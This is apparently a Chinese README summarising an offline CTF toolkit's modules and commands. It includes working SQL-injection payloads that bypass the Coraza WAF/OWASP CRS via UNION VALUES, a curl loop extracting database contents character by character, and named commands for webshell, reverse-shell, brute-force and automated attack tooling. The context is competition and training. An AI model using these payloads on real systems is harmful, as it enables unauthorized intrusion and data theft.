# CTF离线版工具包 - 最终能力总结

## 📊 总览

| 项目 | 数量 |
|------|------|
| 脚本/模块 | 48个 |
| 快捷命令 | 42个 |
| 漏洞类型 | 24+种 |
| 语言 | Python + Bash |
| GUI标签页 | 8个 |
| 漏洞插件 | 21个 |

## 🎯 九大模块能力

### 1️⃣ Web攻击 (10个脚本, 11个命令)
- ✅ Web快速侦察 (10项检测)
- ✅ SQL注入 (4种+sqlmap+**Coraza WAF绕过**)
- ✅ 文件上传绕过 (6种技术)
- ✅ SSTI模板注入 (5引擎+RCE)
- ✅ 文件包含 (LFI/RFI/伪协议)
- ✅ XSS检测 (反射/存储/DOM)
- ✅ JWT攻击 (alg=none/密钥爆破)
- ✅ 命令注入 (管道符/反引号/$())
- ✅ Webshell生成 (PHP/JSP/ASP/Python/反弹Shell)
- ✅ 自动化漏洞利用

### 2️⃣ 密码学 (4个脚本, 4个命令)
- ✅ 自动解密 (Base64/32/16, URL, Unicode, Hex)
- ✅ 古典密码 (Caesar/Vigenère/Rail Fence/Bacon/Morse)
- ✅ 现代密码 (RSA/AES/DES/ChaCha20/XOR)
- ✅ RSA攻击 (小e/共模/分解/Wiener/Hastad)
- ✅ 哈希破解 (MD5/SHA/NTLM/MySQL)

### 3️⃣ PWN (4个脚本, 4个命令)
- ✅ 保护检查 (NX/ASLR/PIE/Canary/RELRO)
- ✅ Exploit模板自动生成
- ✅ 模式字符串生成+偏移计算
- ✅ ROP gadget搜索

### 4️⃣ 逆向 (3个脚本, 3个命令)
- ✅ 静态分析 (strings/objdump/r2/Ghidra)
- ✅ 动态分析 (ltrace/strace/gdb+pwndbg)
- ✅ Python字节码反编译 (.pyc)

### 5️⃣ Misc (5个脚本, 5个命令)
- ✅ 隐写分析 (PNG/JPEG/GIF/音频, 10项检测)
- ✅ 文件取证 (元数据/嵌入文件/损坏修复)
- ✅ 流量分析 (HTTP/DNS/FTP, Flag自动搜索)
- ✅ 文件类型深度分析
- ✅ 压缩包破解 (伪加密/CRC/密码爆破)

### 6️⃣ 侦察 (4个脚本, 4个命令)
- ✅ 端口扫描 (TCP/UDP, 服务版本识别)
- ✅ 服务枚举 (SMB/SNMP/LDAP/NFS/SMTP)
- ✅ 暴力破解 (SSH/FTP/MySQL/HTTP)
- ✅ 目录FUZZ (gobuster/ffuf/dirsearch)

### 7️⃣ 防御AWD (5个脚本, 4个命令)
- ✅ 流量监控 (实时告警)
- ✅ 漏洞修补 (SSH/MySQL/Redis/Apache/Nginx)
- ✅ Flag保护 (权限600/inotify监控)
- ✅ 攻击检测 (Webshell/后门/异常进程)
- ✅ AWD自动化 (自动攻击+防御+提交)

### 8️⃣ 自动化 (3个脚本, 3个命令)
- ✅ 全自动攻击链 (侦察→扫描→利用→Flag→报告)
- ✅ Flag搜索 (文件/DB/内存/环境变量)
- ✅ 批量利用 (多目标并行)

### 9️⃣ 新增模块 (SAS CTF 2026) (2个脚本+3个插件, 4个命令)
- ✅ **WAF绕过模块** (waf_bypass.py)
  - Coraza WAF检测与绕过
  - **UNION VALUES完全绕过 @detectSQLi** ← 核心发现
  - left/right替代substring绕过
  - WAF函数矩阵 (14允许/13拦截)
  - PL/pgSQL EXECUTE注入检测
  - 游戏API端点发现
  - PDF泄露Flag检测

- ✅ **游戏题自动化** (game_auto.py)
  - 游戏API端点自动发现
  - BFS自动寻路算法
  - 自动收集星星
  - Kernel代码生成器
  - Sandbox限制检测

- ✅ **主引擎新增插件** (engine.py)
  - Coraza WAF绕过插件 (coraza_bypass)
  - 游戏API插件 (game_api)
  - PDF泄露插件 (pdf_leak)

## 🚀 快速命令速查

### 攻击
```bash
ctf web-recon <URL>        # Web侦察(10项)
ctf sqli <URL> [param]     # SQL注入(4种+sqlmap)
ctf upload <URL> [path]    # 上传绕过(6种技术)
ctf ssti <URL> [param]     # SSTI(5引擎+RCE)
ctf lfi <URL> <param>      # 文件包含(LFI/RFI/伪协议)
ctf shell all              # 生成全类型Webshell/反弹Shell
ctf exploit <URL>          # 自动化漏洞利用
```

### 密码学
```bash
ctf crypto auto <input>    # 自动检测+3层递归解码
ctf rsa small_e 3 <c>      # RSA小指数攻击
ctf hash <HASH>            # 哈希识别+破解
ctf encode <TEXT>          # 多重编码检测
```

### PWN
```bash
ctf pwn-check <BINARY>     # 保护检查+利用建议
ctf pwn-exploit <BINARY>   # 自动生成exploit模板
ctf pwn-pattern <LEN>      # 生成模式字符串
ctf pwn-rop <BINARY>       # ROP gadget搜索
```

### 逆向
```bash
ctf rev <BINARY>           # 静态分析(strings/objdump/r2)
ctf rev-dynamic <BINARY>   # 动态分析(ltrace/strace/gdb)
ctf rev-pyc <FILE>         # Python字节码反编译
```

### Misc
```bash
ctf stego <FILE>           # 隐写分析(10项)
ctf pcap <FILE>            # 流量分析(HTTP/DNS/FTP/Flag搜索)
ctf zip <FILE>             # 压缩包(伪加密/CRC/john)
ctf file <FILE>            # 文件类型深度分析
ctf forensics <FILE>       # 文件取证分析
```

### 侦察
```bash
ctf scan <TARGET>          # 端口扫描+服务识别
ctf enum <TARGET>          # 服务枚举
ctf brute <TARGET> <SVC>   # 暴力破解(ssh/ftp/mysql)
ctf fuzz <URL>             # 目录/参数FUZZ
```

### 防御 (AWD)
```bash
ctf monitor [IFACE]        # 流量监控
ctf patch <SERVICE>        # 漏洞修补
ctf flag-protect           # Flag文件保护
ctf detect [IFACE]         # 攻击检测
```

### 自动化
```bash
ctf auto <TARGET>          # 全自动攻击链
ctf flag-hunt [PATH]       # Flag搜索
ctf batch <TARGETS_FILE>   # 批量利用
ctf loot                   # 查看战利品
ctf gui                    # 启动图形界面
```

### 新增 (SAS CTF 2026)
```bash
python3 waf_bypass.py waf_detect <URL>      # WAF检测
python3 waf_bypass.py union_values <URL> <param>  # UNION VALUES绕过
python3 game_auto.py auto <URL>             # 游戏题自动化
python3 game_auto.py kernel <direction>     # 生成kernel
```

## 🎯 核心技术亮点

### 1. Coraza WAF绕过 (SAS CTF 2026 Gav题验证)

**核心发现**: `UNION VALUES` 完全绕过 `@detectSQLi`

```sql
-- ✅ 完全绕过WAF
x' UNION VALUES(current_database())--
x' UNION VALUES(''||ASCII('A'))--  -- 返回65

-- ❌ 被拦截
x' UNION SELECT 'test'--           -- 403
```

**技术细节**:
- Coraza WAF检查 `ARGS_NAMES|ARGS` (GET参数)
- **不检查** Cookie/POST body/Header/JSON body
- `UNION VALUES` 不在OWASP CRS检测规则中
- PostgreSQL原生支持 `SELECT ... UNION VALUES (...)` 语法

**数据提取**:
```sql
-- 提取第N个字符 (N从0开始)
x' UNION VALUES(''||ASCII(left(right(current_database(),-N),1)))--

-- 完整提取脚本
for i in 0 1 2 3 4 5; do
    if [ $i -eq 0 ]; then
        expr="left(current_database(),1)"
    else
        expr="left(right(current_database(),-${i}),1)"
    fi
    ascii=$(curl -s "${URL}&pulse=x%27UNION%20VALUES(%27%27||ASCII(${expr}))--" | python3 -c "import sys,json; print(json.load(sys.stdin).get('signal',{}).get('pulse_quality',0))")
    char=$(printf "\\$(printf '%03o' "$ascii")")
    echo "Position $((i+1)): ASCII=$ascii char='$char'"
done
```

**WAF允许/拦截函数矩阵**:
```sql
-- ✅ 允许直接调用
current_database(), current_setting(), current_user, pg_backend_pid()
trim(), upper(), lower(), reverse(), initcap()
left(), right()  ← substring的替代品
ASCII()  ← 仅直接调用可用，子查询中被拦
set_config(), ''||expr 字符串拼接

-- ❌ 被拦截 (500)
substring(), replace(), regexp_replace(), translate()
length(), char_length(), octet_length(), strpos(), position()
overlay(), lpad(), rpad(), split_part()
pg_read_file(), lo_import(), lo_from_bytea()
dblink_connect(), dblink_exec()
(SELECT ...) 子查询, CASE WHEN
```

### 2. 游戏题自动化 (SAS CTF 2026 Kolobok题验证)

**API端点**:
- `GET /game_state` - 获取游戏状态
- `POST /move_manual` - 手动移动
- `POST /reset_game` - 重置游戏
- `GET /get_flag` - 获取flag

**方向映射**:
```python
{
    "left":  {"dx": -1, "dy": 0},
    "right": {"dx": 1, "dy": 0},
    "up":    {"dx": 0, "dy": -1},
    "down":  {"dx": 0, "dy": 1},
}
```

**BFS寻路算法**:
- 自动寻找到目标的最短路径
- 避开墙壁和敌人邻格
- 支持动态地图更新

**Kernel代码生成**:
```python
# 单步移动
def player_kernel(m, a, o):
    o[0] = 1  # 左

# 路径移动
def player_kernel(m, a, o):
    steps = [1, 2, 3, 4]
    for step in steps:
        o[0] = step

# 智能kernel (避开敌人，收集星星)
def player_kernel(m, a, o):
    # 查找玩家位置
    for y in range(9):
        for x in range(9):
            if m[y][x] == 80:
                # 寻找星星并移动
                ...
```

**Sandbox限制** (SAS CTF 2026验证):
- ❌ 禁止: `import`, `__name__`, `lambda`, `while`, `return`, `or`, `and`
- ❌ 禁止: `list()`, `type()`, `print()`, 三元表达式
- ✅ 允许: `for range`, `if`, `len`, 索引访问, `abs`, `%`, `//`

### 3. PDF泄露Flag检测

**识别特征**:
- 题目描述提到"内部文档"/"不小心泄露"
- 附件包含表格形式的flag列表

**提取方法**:
```bash
# 提取PDF文本
mutool draw -F txt file.pdf 1 2>&1 | grep -i "SAS{"
strings file.pdf | grep -i "flag\|SAS{"
```

**Flag格式匹配**:
```python
FLAG_PATTERNS = [
    r"flag\{[^}]{3,80}\}",
    r"FLAG\{[^}]{3,80}\}",
    r"ctf\{[^}]{3,80}\}",
    r"CTF\{[^}]{3,80}\}",
    r"SAS\{[^}]{3,80}\}",
    r"key\{[^}]{3,80}\}",
    r"secret\{[^}]{3,80}\}",
    r"token\{[^}]{3,80}\}",
]
```

## 📁 文件结构

```
ctf-toolkit/
├── ctf.sh              主入口路由
├── setup.sh            初始化
├── engine.py           主引擎 (21个漏洞插件)
├── waf_bypass.py       WAF绕过模块 ← NEW
├── game_auto.py        游戏题自动化 ← NEW
├── vulnlab.py          靶场模块
├── gui/                图形界面 (8标签页)
├── web/                Web模块 (10个脚本)
├── crypto/             密码学模块 (4个脚本)
├── pwn/                PWN模块 (4个脚本)
├── reverse/            逆向模块 (3个脚本)
├── misc/               Misc模块 (5个脚本)
├── recon/              侦察模块 (4个脚本)
├── defense/            防御模块 (5个脚本)
├── scripts/            自动化脚本 (3个)
├── payloads/           Payload库
├── wordlists/          字典库
└── loot/               战利品
```

## 🎓 使用场景

### 场景1: CTF比赛 (Jeopardy)
```bash
# 快速侦察
ctf web-recon http://target.com

# 自动化扫描
ctf auto http://target.com

# Flag搜索
ctf flag-hunt /tmp
```

### 场景2: AWD攻防赛
```bash
# 赛前加固
ctf flag-protect
ctf patch all

# 攻击阶段
ctf scan 192.168.1.0/24
ctf auto 192.168.1.100

# 持续防御
ctf monitor
ctf detect
```

### 场景3: 隔离网络比赛
```bash
# 使用离线工具包
bash ctf.sh web-recon http://target
bash ctf.sh sqli http://target?id=1
bash ctf.sh crypto base64 SGVsbG8=
```

### 场景4: 游戏题 (Kolobok模式)
```bash
# 自动玩游戏
python3 game_auto.py auto https://game.ctf.com

# 生成kernel
python3 game_auto.py kernel 左
```

### 场景5: WAF绕过 (Coraza)
```bash
# 检测WAF
python3 waf_bypass.py waf_detect https://target.com/api

# 绕过并提取数据
python3 waf_bypass.py union_values https://target.com/api id current_database()
```

## 🏆 核心优势

1. **全覆盖**: Web/Crypto/PWN/Reverse/Misc全题型
2. **自动化**: 21个漏洞插件 + 智能爬虫 + 自动利用
3. **离线可用**: 不依赖网络，适合隔离环境
4. **模块化**: 独立脚本，易于扩展
5. **GUI支持**: 图形界面一键操作
6. **AWD支持**: 攻防赛专用模块
7. **实战验证**: SAS CTF 2026经验优化

## 📚 文档索引

1. **README.md** - 快速入门
2. **CAPABILITIES.md** - 完整能力清单 (详细版)
3. **QUICK_SUMMARY.txt** - 能力快速摘要 (简明版)
4. **FINAL_SUMMARY.md** - 本文件 (最终总结)
5. **UPDATE_LOG.md** - 更新日志
6. **SAS_CTF_2026_OPTIMIZATION.md** - SAS CTF经验优化
7. **USAGE.md** - 详细使用说明 (600+行)

## 📈 版本历史

- v1.0: 基础脚本集合
- v2.0: 模块化架构
- v3.0: GUI图形界面
- v4.0: 自动化引擎
- v5.0: AWD防御模块
- v6.0: 插件化架构 (21个插件)
- **v6.1**: SAS CTF 2026优化 (WAF绕过/游戏题/PDF泄露) ← 当前版本

## 🎯 总结

CTF离线版工具包是一个**全覆盖、自动化、离线可用**的CTF竞赛工具集，包含48个脚本/模块、42个快捷命令、21个漏洞插件，支持Web/Crypto/PWN/Reverse/Misc全题型，并提供GUI图形界面和AWD攻防赛专用模块。

**核心价值**:
- 实战验证的技术积累
- 持续更新的能力覆盖
- 模块化可扩展的架构
- 离线环境完美支持

**适用场景**:
- CTF比赛 (Jeopardy/Attack-Defense)
- 隔离网络竞赛
- 安全培训与学习
- 渗透测试实践

---

**最后更新**: 2026-06-07  
**版本**: v6.1  
**作者**: CTF Automation Team  
**文档**: /root/ctf-toolkit/
